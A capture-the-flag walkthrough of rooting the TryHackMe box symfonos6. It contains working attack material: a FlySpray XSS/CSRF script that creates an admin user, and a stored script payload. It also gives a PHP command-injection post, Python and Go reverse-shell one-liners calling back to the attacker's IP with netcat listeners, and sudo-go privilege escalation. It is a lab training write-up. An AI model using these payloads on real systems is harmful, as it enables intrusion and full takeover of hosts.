# hacking the box symfonos6 on https://tryhackme.com, based on what optionalctf did in this [VOD](https://www.twitch.tv/videos/594716003)

Tested on a fresh Kali Linux system.

Start with port scan:
`nmap -T5 --min-rate 2500 -sV 10.10.247.125 -oN nmap`

Result:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3000/tcp open  ppp?
3306/tcp open  mysql   MariaDB (unauthorized)                                       
5000/tcp open  upnp?                                                                         
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                      
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============                           
SF-Port3000-TCP:V=7.80%I=7%D=4/17%Time=5E9A1EEE%P=x86_64-pc-linux-gnu%r(Ge                                    
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t                                    
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x                                        
SF:20Request")%r(GetRequest,2926,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\            
```

Next I installed Go and gobuster:

```
apt-get install golang
go get github.com/OJ/gobuster
export PATH=$PATH:/root/go/bin
```

First test with the medium wordlist:

`gobuster dir -u http://10.10.247.125/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

No results. Needs another wordlist which is not pre-installed:

```
apt -y install seclists
gobuster dir -u http://10.10.247.125/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

Result:

```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/flyspray (Status: 301)
/posts (Status: 301)
```

When opening the website http://10.10.247.125/flyspray/ in web browser, there is a comment for the bug reports:

```
http://10.10.247.125/flyspray/index.php?do=details&task_id=1&status%5B0%5D= says:
Mr Super User commented on 30.03.2020 16:39
I will be checking this page frequently for updates.
```

Let's see if there is a known vulnerability for flyspray: `searchsploit flyspray`

One result:

```
FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery                  | exploits/php/webapps/41918.txt
```

With `searchsploit -x 41918` we can see the details for this exploit. Next we create the file script.js from the exploit:

```
var tok = document.getElementsByName('csrftoken')[0].value;
var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'
var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

Then we start a local webserver: `python -m SimpleHTTPServer 80`. Ttesting: http://localhost/script.js returns the content of the file.

Checking local IP with ifconfig: 10.10.244.179

Creating a new user "test" at http://10.10.247.125/flyspray

Open task http://10.10.247.125/flyspray/index.php?do=details&task_id=1 and add a comment.

Change user profile, use this for real name: `"><script src="http://10.10.244.179/script.js" />`

Script is loaded from a simulated web browser by Super User after a minute:

```
10.10.247.125 - - [17/Apr/2020 22:56:27] "GET /script.js HTTP/1.1" 200 -
```

This creates a new user `hacker` with the password `12345678`. Now there is a new bug report visible,
with the credentials to the git: http://10.10.247.125/flyspray/index.php?do=details&task_id=2

Sign in to http://10.10.247.125:3000 and browse the source code:

`main.go`: creates a new go web server for an API, with the URL starting at symfonos-ap/api/api.go: /ls2o4g
the file symfonos-api/api/api/v1.0/v1.0.go defines the next URL part, /v1.0, and then the services: ping, auth and posts.

So the full URL is http://10.10.247.125:5000/ls2o4g/v1.0/ping result page is a JSON file: `{"message":"pong"}`

For login, the same username and password can be used as for the git service:
```
curl -s -L -X POST "http://10.10.247.125:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "xxxxxx", "password" : "xxxxxxxxx" }'
```

Result:

```
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODc3NzE4NTUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ._Dhi69xKLx5LRKJEUpfwLwyK_2ZlHUb9NDfIg2ZKQ94","user":{"display_name":"achilles","id":1,"username":"achilles"}}
```

The token is jwt encoded. With the website https://jwt.show it can be decoded:
```
{
  "exp": 1587771855,
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}
```

There is a post service as well. The token can be saved and then the POST service called with it. First install the JSON commandline processor:

```
apt-get install jq
```

then a script can load the token and send the POST request:

```
TOKEN=$(curl -s -L -X POST "http://10.10.247.125:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "xxxxxxx", "password" : "xxxxxxxx" }' | jq -r '.token')
curl -L -X POST "http://10.10.247.125:5000/ls2o4g/v1.0/posts" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" --data-raw '{"text": "system($_GET['cmd']);" }'
```

The posting is interpreted as PHP, because it uses `preg_replace`with the `e` flag, which executes the string it replaces as PHP code.
The relevant part of index.php (which you can see as well in the git repository) is the following:

```
<?php
while ($row = mysqli_fetch_assoc($result)) {
		$content = htmlspecialchars($row['text']);
		
		echo $content;

		preg_replace('/.*/e',$content, "Win");
}
?>
```

With the last curl command, a new posting `system($_GET['cmd'])` was added. We can now start netcat on our local system like this:

```
local system: nc -lvnp 9001
```

Then start the reverse shell as described here: [Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
using the system PHP hack, so open this in a web browser:

```
http://10.10.247.125/posts/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.244.179",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This gives a remote shell as user apache. Now you can change to the user achilles.
but first we need to start a new shell, otherwise password enter of "su" doesn't work:

```
python -c 'import pty; pty.spawn("/bin/bash")'
su achilles
same password as above
```

Then we can check with `sudo -l`which commands can be started as root from the user. Result: `(ALL) NOPASSWD: /usr/local/go/bin/go`.

Next we search for a go reverse shell. Google search for "payload of all things": https://github.com/swisskyrepo/PayloadsAllTheThings
On this page is a link to a reverse shell sheet cheat: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md For go you can start a reverse shell like this:
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

On your local system, start another netcat:

```
local netcat: nc -lvnp 9002
```

On the target system, save the remote shell script as shell.go:

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.244.179:9002");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > shell.go
```

Then start the root shell:

```
sudo /usr/local/go/bin/go run shell.go
```

Now you have a root shell in the netcat window. The required proof.txt is in the root directory.
For "initial version" they want the full FlySpray version, which was not obvious for me.
